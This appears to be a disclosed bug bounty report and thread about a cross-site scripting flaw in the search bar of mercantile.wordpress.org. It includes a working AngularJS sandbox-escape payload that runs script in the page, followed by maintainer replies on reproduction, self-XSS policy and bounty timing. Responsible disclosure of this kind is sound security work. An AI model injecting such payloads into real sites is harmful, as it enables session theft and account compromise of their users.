title: XSS in the search bar of mercantile.wordpress.org
vulnerability_information_html:
Hi wordpress! Glad to see you here at H1.

   I found a XSS issue in the https://mercantile.wordpress.org/s=<payload here>

This works with the angular js payloads. I did inject a angular js code its because I found the ng-bindable in the source.

STEPS TO REPRODUCE

  1. Go to https://mercantile.wordpress.org
  2. Click on search and put this payload: > {{ c=''.sub.call;b=''.sub.bind;a=''.sub.apply; c.$apply=$apply;c.$eval=b;op=$root.$$phase; $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString; C=c.$apply(c);$root.$$phase=op;$root.$digest=od; B=C(b,c,b);$evalAsync(" astNode=pop();astNode.type='UnaryExpression'; astNode.operator='(window.X?void0:(window.X=true,prompt(document.domain)))+'; astNode.argument={type:'Identifier',name:'foo'}; "); m1=B($$asyncQueue.pop().expression,null,$root); m2=B(C,null,m1);[].push.apply=m2;a=''.sub; $eval('a(b.c)');[].push.apply=a; }} As you could now see the domain has been popped up.

If you have any questions just tell me and I will try my best to have an answer.

Kind Regards,
Tom

additional_data.old_title: XSS in the search bar of mercantile.wordpress.com
additional_data.new_title: XSS in the search bar of mercantile.wordpress.org

activities.message: Thanks Tom, I was able to reproduce this in IE11.  We're working on a fix and will let you know once we have more information.
activities.markdown_message: Thanks Tom, I was able to reproduce this in IE11. We're working on a fix and will let you know once we have more information.

activities.message:
Hi @iandunn  thankyou for confirming me that this works in IE11 because I don't have that browser :3 hope to get that one soon :D. I'd like to inform you that this would work also in chrome and mozilla firefox. 
Note: this can be send to anyone including those who registered to that website

Kind Regards,
Tom

activities.message:
Oh, sorry, I didn't mean to imply that it wasn't reproducible in other browsers; I just wanted to document which one I used.

I've routed this report to the devs who built that theme, and they're looking into. I'll let you know once I have some more info from them.

( Side note: If you're not already aware, [Microsoft provides Virtualbox images of it OSes and browsers](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/) for this kind of testing. It's pretty easy to setup, and comes in handy )
activities.markdown_message:

activities.message:
We wouldn't be interested in the typical self-XSS where the user is asked to paste malicious JS into the browser console, since that's not an actual vulnerability in the website itself, it's just social engineering on the user, and it could be done with any site.

If you feel like the attack you found is more severe than that, though, feel free to open report. We can always close it as `Informative` if it ends up being something that's not severe enough for us to act on.
activities.markdown_message:
We wouldn't be interested in the typical self-XSS where the user is asked to paste malicious JS into the browser console, since that's not an actual vulnerability in the website itself, it's just social engineering on the user, and it could be done with any site.

If you feel like the attack you found is more severe than that, though, feel free to open report. We can always close it as Informative if it ends up being something that's not severe enough for us to act on.

activities.message: Ayt sorry It would be not paste through the browsers console but the same payload I used above and put it in a form field this time it is stored but the only account holder could be affected

Great, glad to hear it. Thanks again for the report!

We can disclose this after the self-XSS report is resolved, since it's mentioned above. If it turns out to be valid, I don't want to disclose it from the comments in this report until after it's resolved too.

activities.message: Hey Tom, sorry for the delay. We just opened this publicly this week, and we're still working out exactly what all the bounties should be. I don't have an exact timeline of when it'll be decided, though. I would guess it'll take about 1-3 weeks, since we're still figuring everything out.
